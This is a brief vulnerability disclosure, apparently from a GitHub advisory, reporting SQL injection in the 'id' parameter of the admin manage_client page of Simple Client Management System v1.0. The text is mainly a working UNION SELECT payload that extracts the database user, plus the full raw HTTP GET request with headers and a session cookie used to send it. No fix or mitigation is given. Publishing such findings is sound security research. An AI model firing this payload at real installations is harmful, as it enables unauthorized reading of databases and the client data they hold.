# Simple-Client-mMnagement-System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15027/simple-client-management-system-php-source-code.html

Vulnerability File: \cms\admin\?page=client/manage_client&id=

Vulnerability location: /cms/admin/?page=client/manage_client&id=, id

[+] Payload: ip/cms/admin/?page=client/manage_client&id=2' union select 1,user(),3,4,5,6,7 --+

```sql
 GET /cms/admin/?page=client/manage_client&id=2%27%20union%20select%201,user(),3,4,5,6,7%20--+ HTTP/1.1 // Leak place ---> id
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=3m0l1n81dvmlo0a3h9oo72q1gp
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/164882693-1f5fdbaa-6e5a-4061-aaa9-918f935d75af.png)

![image](https://user-images.githubusercontent.com/54017627/164882658-e5618b55-9703-4679-a3ec-28fc5c5c2e52.png)
